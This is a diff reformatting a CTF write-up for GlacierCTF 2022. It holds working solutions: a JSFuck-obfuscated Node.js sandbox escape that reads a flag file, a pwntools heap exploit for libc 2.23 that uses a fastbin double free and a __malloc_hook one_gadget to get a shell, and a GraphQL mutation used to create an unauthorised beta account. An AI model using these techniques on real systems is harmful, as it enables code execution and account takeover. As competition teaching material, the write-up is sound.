@@ -4,9 +4,10 @@ date: "2022-11-28"
 tags: ["CTF", "glacier", "jeopardy"]
 ---
 
-# Pwn
+## Pwn
 
-## Break the calculator
+### Break the calculator
+
 The following code runs on the server:
 
 ```js
@@ -46,7 +47,11 @@ As we can use all the symbols we want, we can simply use [JSFuck](http://www.jsf
 The payload is the following:
 
 ```js
-console.log(process.mainModule.constructor._load('fs').readFileSync('/app/flag.txt', 'utf8'));
+console.log(
+  process.mainModule.constructor
+    ._load("fs")
+    .readFileSync("/app/flag.txt", "utf8"),
+);
 ```
 
 and the script to send the payload is the following:
@@ -57,7 +62,7 @@ and the script to send the payload is the following:
 from pwn import *
 
 io = remote("pwn.glacierctf.com", 13375)
-# console.log(process.mainModule.constructor._load('fs').readFileSync('/app/flag.txt', 'utf8'));
+## console.log(process.mainModule.constructor._load('fs').readFileSync('/app/flag.txt', 'utf8'));
 io.sendlineafter(
     b"Please type in formula:",
     "[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+((!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[!+[]+!+[]]+([][[]]+[])[+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+([][[]]+[])[!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+([][[]]+[])[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]])[(![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]]((!![]+[])[+[]])[([][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]](([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+![]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])()[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])+[])[+!+[]])+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]])())",
@@ -66,15 +71,17 @@ io.sendlineafter(
 io.interactive()
 ```
 
-## Old dayz
+### Old dayz
+
 This is a heap challenge, but with the novelty being that it uses libc2.23 (basically, the libc used by ubuntu 16.04). The challenge files can be downloaded [here](/downloadables/glacier_old_dayz.zip).
 
 Inside the binary, we have the standard menu: we can malloc up to 0x1000 bytes, free our previously allocated memory, write on it and read it.
-The issue is that the free functionality is implemented incorrectly: it does *not* zero out the pointers, therefore leaving us with a dangling reference and the possibility to manipulate the heap at our wish.
+The issue is that the free functionality is implemented incorrectly: it does _not_ zero out the pointers, therefore leaving us with a dangling reference and the possibility to manipulate the heap at our wish.
 
 The first thing we have to do is to leak a libc address. To do so, we can use a very standard technique, that is reading the memory from a freed chunk that is in the unsorted bin. This works as the unsorted bin contain a pointer to the bin structure residing in libc.
 
 Then, we can overwrite a hook (`__malloc_hook` or `__free_hook`). To do so, we can force the heap to return us a point to it. However, libc2.23 has an additional check on the returned pointer:
+
 ```c
   if ((unsigned long) (nb) <= (unsigned long) (get_max_fast ()))
     {
@@ -91,7 +98,7 @@ Then, we can overwrite a hook (`__malloc_hook` or `__free_hook`). To do so, we c
              != victim);
       if (victim != 0)
         {
-          // Checks that the chunksize of the target chunk fastbin index 
+          // Checks that the chunksize of the target chunk fastbin index
           // is the same as the fastbin index we are allocating from
           if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
             {
@@ -107,11 +114,13 @@ Then, we can overwrite a hook (`__malloc_hook` or `__free_hook`). To do so, we c
         }
     }
 ```
-Due to this check, we need to return a pointer to a part of memory that contains a valid fastbin size. Luckily, `__malloc_hook` has a zone of memory very near it (while `__free_hook` doesn't). This is made possible by the fact that malloc here does *not* check that the returned chunk is aligned. Due to having only access to `__malloc_hook`, we need to use a `one_gadget` to overwrite it and pop a shell.
+
+Due to this check, we need to return a pointer to a part of memory that contains a valid fastbin size. Luckily, `__malloc_hook` has a zone of memory very near it (while `__free_hook` doesn't). This is made possible by the fact that malloc here does _not_ check that the returned chunk is aligned. Due to having only access to `__malloc_hook`, we need to use a `one_gadget` to overwrite it and pop a shell.
 
 So, to implement this attack, we need to get a pointer to `__malloc_hook`. This can be done by using a [fastbin double free](https://github.com/shellphish/how2heap/blob/master/glibc_2.23/fastbin_dup_into_stack.c), which then overwrites `__malloc_hook` with a suitable `one_gadget`.
 
 The exploit is the following:
+
 ```py
 #!/usr/bin/env python3
 
@@ -139,7 +148,7 @@ def conn(*a, **kw):
         return remote(HOST, PORT, **kw)
 
 
-# Add functions below here, if needed
+## Add functions below here, if needed
 def add(idx, size):
     io.sendlineafter(b"> ", b"1")
     io.sendlineafter(b"idx:", str(idx).encode())
@@ -170,36 +179,36 @@ def main():
     global io
     io = conn(level="debug")
 
-    # good luck pwning :)
-    # leak libc
-    add(0, 0x450)  # unsorted bin size
-    add(1, 0x10)  # avoid consolidation of the above when freed
-    free(0)  # puts 0 in unsorted bins
-    view(0)  # libc leak
+    ## good luck pwning :)
+    ## leak libc
+    add(0, 0x450)  ## unsorted bin size
+    add(1, 0x10)  ## avoid consolidation of the above when freed
+    free(0)  ## puts 0 in unsorted bins
+    view(0)  ## libc leak
     libc.address = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00")) - (
-        libc.symbols.main_arena + 88  # Offset of the leak found with GDB
+        libc.symbols.main_arena + 88  ## Offset of the leak found with GDB
     )
     log.success(f"libc @ {hex(libc.address)}")
 
-    # cleanup
+    ## cleanup
     add(0, 0x450)
 
-    # overwrite __malloc_hook
+    ## overwrite __malloc_hook
     add(3, 0x60)
     add(4, 0x60)
-    # fastbin double free
+    ## fastbin double free
     free(3)
 
-    # free(4) needed to bypass a check: https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3933
+    ## free(4) needed to bypass a check: https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3933
     free(4)
-    free(3)  # double free!
+    free(3)  ## double free!
 
-    # chunksize on this pointer returns a size of 0x7f, which is valid for fastbins
-    # 0x7f comes by taking a misaligned pointer to libc
+    ## chunksize on this pointer returns a size of 0x7f, which is valid for fastbins
+    ## 0x7f comes by taking a misaligned pointer to libc
     change(3, p64(libc.symbols.__malloc_hook - 0x23))
 
     add(5, 0x60)
-    add(6, 0x60)  # contains our pointer into libc!
+    add(6, 0x60)  ## contains our pointer into libc!
 
     """
     0x45226 execve("/bin/sh", rsp+0x30, environ)
@@ -218,11 +227,11 @@ def main():
     constraints:
       [rsp+0x70] == NULL
     """
-    # Overwrite __malloc_hook with a one_gadget
+    ## Overwrite __malloc_hook with a one_gadget
     change(6, b"A" * 3 + b"B" * 8 * 2 + p64(libc.address + 0x4527A))
-    add(0, 0x10)  # Trigger __malloc_hook
-    
-    # Profit!
+    add(0, 0x10)  ## Trigger __malloc_hook
+
+    ## Profit!
     io.sendline(b"cat flag.txt")
     io.interactive()
 
@@ -231,13 +240,13 @@ if __name__ == "__main__":
     main()
 ```
 
-# Web
+## Web
 
-## FlagCoin
+### FlagCoin
 
-*Our new 110% legit cryptocurrency is so cool, it does not even use blockchains. We have a WIP web interface for trading though. Hope nobody can get a beta testing account.*
+_Our new 110% legit cryptocurrency is so cool, it does not even use blockchains. We have a WIP web interface for trading though. Hope nobody can get a beta testing account._
 
-### Solution
+#### Solution
 
 The fist thing we see is a simple login screen:
 ![](/images/glacierctf2022_flagcoin_login.png)
@@ -246,57 +255,69 @@ We can notice that the registration is disabled, so we can only log in existing 
 Looking at the source code, we notice nothing special.
 
 Using **Burp Suite**, we can take a look at the performed request:
+
 ```json
-{"query":"\n      mutation($username: String!, $password: String!) { \n        login(username: $username, password: $password) { \n          username \n        } \n      }\n      ","variables":{"username":"blabla","password":"ciaociao"}}
+{
+  "query": "\n      mutation($username: String!, $password: String!) { \n        login(username: $username, password: $password) { \n          username \n        } \n      }\n      ",
+  "variables": { "username": "blabla", "password": "ciaociao" }
+}
 ```
 
 We notice that a **mutation** query is performed.
-That's the *key* to the solution.
+That's the _key_ to the solution.
 
-The idea was to gain the access to the *beta* account.
+The idea was to gain the access to the _beta_ account.
 
 That's how I did this:
+
 1. Using a tool ([GraphQL Map](https://github.com/swisskyrepo/GraphQLmap)), I discovered that there were 3 possible mutations: **login.query**, **redeem.query** (which comes in hand for stage 2) and **register_beta_user.query** (the one I was looking for)
 
 2. Opening the **register_beta_user.query** file, here is what I obtained:
+
 ```json
- {"query": "mutation {\n\tregister_beta_user(username:String, password:String) {\n\t\tusername\n\t\tpassword\n\t\tcoins\n\t}\n}"}
+{
+  "query": "mutation {\n\tregister_beta_user(username:String, password:String) {\n\t\tusername\n\t\tpassword\n\t\tcoins\n\t}\n}"
+}
 ```
 
-3. Now we can inject the request (again using *Burp*) to perform the *register_beta_user* query:
+3. Now we can inject the request (again using _Burp_) to perform the _register_beta_user_ query:
+
 ```json
-{"query":"\n      mutation($username: String!, $password: String!) { \n        register_beta_user(username: $username, password: $password) { \n          username \n        } \n      }\n      ","variables":{"username":"beta","password":"tester"}}
+{
+  "query": "\n      mutation($username: String!, $password: String!) { \n        register_beta_user(username: $username, password: $password) { \n          username \n        } \n      }\n      ",
+  "variables": { "username": "beta", "password": "tester" }
+}
 ```
 
 4. Than we can login with the new account:
-![](/images/glacierctf2022_flagcoin_solved_login.png)
+   ![](/images/glacierctf2022_flagcoin_solved_login.png)
 
 After logging in, we are welcomed with the flag:
 `glacierctf{bUy_Th3_d1P_br0h}`
 
+### RCE as a Service
 
-## RCE as a Service
+#### Stage 1
 
-### Stage 1
+##### Challenge description
 
-#### Challenge description
